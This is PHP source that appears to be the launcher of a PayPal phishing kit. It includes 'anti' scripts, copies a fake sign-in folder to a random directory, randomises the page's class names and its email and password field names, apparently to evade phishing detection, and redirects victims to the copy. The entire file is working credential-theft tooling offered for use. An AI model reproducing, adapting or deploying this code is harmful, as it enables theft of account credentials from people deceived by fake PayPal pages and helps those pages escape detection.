<?php 
@error_reporting();
require_once 'anti/anti0.php';
require 'anti/anti1.php';
require 'anti/anti2.php';
require 'anti/anti3.php';
require 'anti/anti4.php';
function genRandString($length=5,$onlyNumbers=false){
	if($onlyNumbers){$chars='0123456789';
}
else
	{$chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";}
	$charactersLength=strlen($chars);$random='';
	for($i=0;$i<$length;$i++){$random.=$chars[rand(0,$charactersLength - 1)];
	}
	return $random;
}
function xstr($s1,$n,$s2){
	return genRandString($s1)."_".genRandString($n,true)."_".genRandString($s2);
}
	function saveFile($file,$tmp){$save=fopen($file,"w+");fwrite($save,$tmp);fclose($save);
}
function genLogin($dir,$t_html,$t_css,$t_php){
	$html=file_get_contents($dir.$t_html);
	$css=file_get_contents($dir.$t_css);
	$php=file_get_contents($dir.$t_php);
	$html=preg_replace('{MAIN}',xstr(4,2,4),$html);
	$html=preg_replace('{CORRAL}',$CORRAL=xstr(4,3,4),$html);
	$html=preg_replace('{CNTCNT}',$CNTCNT=xstr(4,3,4),$html);
	$html=preg_replace('{EMAIL_LOGIN}',$EMAIL_LOGIN=xstr(4,3,4),$html);
	$html=preg_replace('{PASSWORD}',$PASSWORD=xstr(4,3,4),$html);
	$html=preg_replace('{ERRORMSG}',$ERRORMSG=xstr(4,3,4),$html);
	$html=preg_replace('{FIELD}',$FIELD=xstr(4,2,4),$html);
	$html=preg_replace('{CLEARFIX}',$CLEARFIX=xstr(4,2,4),$html);
	$html=preg_replace('{PAYPALLOGO}',$PAYPALLOGO=xstr(4,2,4),$html);
	$html=preg_replace('{PPLLOGOSVG}',$PPLLOGOSVG=xstr(4,2,4),$html);
	$html=preg_replace('{ACTN}',$ACTN=xstr(4,2,4),$html);
	$html=preg_replace('{BTN}',$BTN=xstr(4,2,4),$html);
	$html=preg_replace('{FORGOT}',$FORGOT=xstr(4,2,4),$html);
	$html=preg_replace('{SIGNSEP}',$SIGNSEP=xstr(4,2,4),$html);
	$html=preg_replace('{ORSEP}',$ORSEP=xstr(4,2,4),$html);
	$html=preg_replace('{NOTIFS}',$NOTIFS=xstr(4,2,4),$html);
	$html=preg_replace('{NOTIFI}',$NOTIFI=xstr(4,2,4),$html);
	$html=preg_replace('{NOTIFALERT}',$NOTIFALERT=xstr(4,2,4),$html);
	$html=preg_replace('{GROUPWS}',$GROUPWS=xstr(4,2,4),$html);
	$html=preg_replace('{FTGROUP}',$FTGROUP=xstr(4,2,4),$html);
	$html=preg_replace('{FOUCOPY}',$FOUCOPY=xstr(4,2,4),$html);
	$html=preg_replace('{FOTDIS}',$FOTDIS=xstr(4,2,4),$html);
	$html=preg_replace('{FOUTR}',$FOUTR=xstr(4,2,4),$html);
	$html=preg_replace('{TEXTINPUT}',$TEXTINPUT=xstr(4,2,4),$html);
	$css=preg_replace('{CORRAL}',$CORRAL,$css);
	$css=preg_replace('{CNTCNT}',$CNTCNT,$css);
	$css=preg_replace('{ERRORMSG}',$ERRORMSG,$css);
	$css=preg_replace('{FIELD}',$FIELD,$css);
	$css=preg_replace('{CLEARFIX}',$CLEARFIX,$css);
	$css=preg_replace('{PAYPALLOGO}',$PAYPALLOGO,$css);
	$css=preg_replace('{PPLLOGOSVG}',$PPLLOGOSVG,$css);
	$css=preg_replace('{ACTN}',$ACTN,$css);
	$css=preg_replace('{BTN}',$BTN,$css);
	$css=preg_replace('{FORGOT}',$FORGOT,$css);
	$css=preg_replace('{SIGNSEP}',$SIGNSEP,$css);
	$css=preg_replace('{ORSEP}',$ORSEP,$css);
	$css=preg_replace('{NOTIFS}',$NOTIFS,$css);
	$css=preg_replace('{NOTIFI}',$NOTIFI,$css);
	$css=preg_replace('{NOTIFALERT}',$NOTIFALERT,$css);
	$css=preg_replace('{GROUPWS}',$GROUPWS,$css);
	$css=preg_replace('{FTGROUP}',$FTGROUP,$css);
	$css=preg_replace('{FOUCOPY}',$FOUCOPY,$css);
	$css=preg_replace('{FOTDIS}',$FOTDIS,$css);
	$css=preg_replace('{FOUTR}',$FOUTR,$css);
	$css=preg_replace('{TEXTINPUT}',$TEXTINPUT,$css);
	$php=preg_replace('{EMAIL_LOGIN}',$EMAIL_LOGIN,$php);
	$php=preg_replace('{PASSWORD}',$PASSWORD,$php);
	saveFile($dir.$t_html,$html);
	saveFile($dir.$t_css,$css);
	saveFile($dir.$t_php,$php);
}function genString(){$characters='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$randomString='';
for($i=0;$i<5;$i++){$randomString.=$characters[rand(0,strlen($characters)- 1)];
}return $randomString;
}$to=genString();
function reCopy($origin,$place){$dir=opendir($origin);
	$result=($dir===false?false:true);
	if($result!==false){$result=@mkdir($place);
		if($result===true){while(false!==($file=readdir($dir))){if(($file!='.')&&($file!='..')&&$result){if(is_dir($origin.'/'.$file)){$result=reCopy($origin.'/'.$file,$place.'/'.$file);
	}
	else{$result=copy($origin.'/'.$file,$place.'/'.$file);
}}}
closedir($dir);
}}
return $result;
}
reCopy("auth",$to);
genLogin($to,"/signin.php","/assets/css/signin.css","/addLogin.php");
genLogin($to,"/myaccount/partials/footer.php","/assets/css/fcc711df38ed6524.css","/addLogin.php");
header("Location: {$to}");
exit();
?>